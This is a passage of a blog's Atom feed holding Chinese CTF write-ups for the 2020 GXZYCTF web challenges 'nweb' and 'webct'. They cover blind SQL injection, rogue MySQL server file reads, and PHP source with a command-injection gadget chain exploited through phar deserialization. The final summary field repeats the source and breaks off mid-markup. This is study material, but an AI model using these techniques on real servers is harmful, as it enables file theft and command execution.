flag+=chr(mid)</span><br></pre></td></tr></table></figure><p>数据库里只有一半的flag：flag{Rogue-MySql-Server- ，同时还得到了admin用户的密码：whoamiadmin</p><p>根据前半段flag和登录后的提示，也就是伪造mysql服务任意文件读取的问题了，通过Rogue-MySql-Server脚本设置读取一下flag.php文件</p><p><img src="/2020/03/09/2020_GXZYCTF_nweb/0-1583751402598.png" alt>            </p><p>也就拿到了flag的后一部分，拼接起来就可以了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据登入后的提示，用户会有分级，注册账号的时候隐藏了type属性&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_nweb/0-1583722768764.png&quot; alt&gt;            &lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_sql注入" scheme="https://boiteam.github.io/tags/Web-sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Web_Rogue-Mysql-Server" scheme="https://boiteam.github.io/tags/Web-Rogue-Mysql-Server/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF webct</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_webct/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_webct/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:25:09.392Z</updated>
    
    <content type="html"><![CDATA[<p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $option;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip,$user,$password,$option)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user=$user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip=$ip;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;option=$option;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testquery</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $m = <span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;ip,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">            <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $m-&gt;options(<span class="keyword">$this</span>-&gt;option,<span class="number">1</span>);</span><br><span class="line">        $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($result-&gt;num_rows&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕，数据库服务器处于开启状态'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'测试完毕,数据库服务器未开启'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uploadfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uploadfile=$filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">xs</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'请求结束'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $extensionarr=<span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">        $extension = pathinfo(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>], PATHINFO_EXTENSION);</span><br><span class="line">        $type = <span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'type'</span>];</span><br><span class="line">        <span class="comment">//echo "type: ".$type;</span></span><br><span class="line">        $filetypearr=<span class="keyword">array</span>(<span class="string">"image/jpeg"</span>,<span class="string">"image/png"</span>,<span class="string">"image/gif"</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$extensionarr)&amp;in_array($type,$filetypearr)&amp;<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"size"</span>]&lt;<span class="number">204800</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"错误：: "</span> .<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_dir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>))&#123;</span><br><span class="line">                    mkdir(<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $upload_dir=<span class="string">"./uploads/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</span><br><span class="line">                move_uploaded_file(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">"tmp_name"</span>],$upload_dir.md5(<span class="keyword">$this</span>-&gt;file-&gt;uploadfile[<span class="string">'name'</span>]).<span class="string">"."</span>.$extension);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"上传成功"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"不被允许的文件类型"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file-&gt;xs();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先题目分为两个功能，一个是连接数据库，一个是上传文件</p><p>这儿的解题思路为</p><p>上传<code>phar.gif</code>，利用mysql服务端恶意读取文件触发<code>phar://</code></p><p>记录一个小坑，PHP的配置一般是常量，因此可以打印下从而解决直接传<code>MYSQLI_OPT_LOCAL_INFILE</code>传输后变字符串的问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $m = <span class="keyword">new</span> mysqli(<span class="string">'117.78.1.xxx'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">    <span class="keyword">if</span>($m-&gt;connect_error)&#123;</span><br><span class="line">        <span class="keyword">die</span>($m-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(MYSQLI_OPT_LOCAL_INFILE);</span><br><span class="line">    $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,<span class="number">1</span>);</span><br><span class="line">    $result=$m-&gt;query(<span class="string">'select 1;'</span>);</span><br></pre></td></tr></table></figure><p>打印出来的值为8，即option为8</p><p>这样就能知道常量MYSQLI_OPT_LOCAL_INFILE的值为多少了~~</p><p>我们直接在vps上开一个mysql服务端，然后读取的文件为phar://xxxx</p><p>这儿的文件为我们上传的phar文件，这样就能触发phar://反序列化了~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;部分源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Db&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $password;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $option;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($ip,$user,$password,$option)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user=$user;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;ip=$ip;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;password=$password;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;option=$option;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;testquery&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $m = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; mysqli(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;ip,&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;user,&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;password);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($m-&amp;gt;connect_error)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;($m-&amp;gt;connect_error);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $m-&amp;gt;options(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;option,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $result=$m-&amp;gt;query(&lt;span class=&quot;string&quot;&gt;&#39;select 1;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($result-&amp;gt;num_rows&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;测试完毕，数据库服务器处于开启状态&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;测试完毕,数据库服务器未开启&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;File&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $uploadfile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($filename)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;uploadfile=$filename;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;xs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;请求结束&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Fileupload&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span 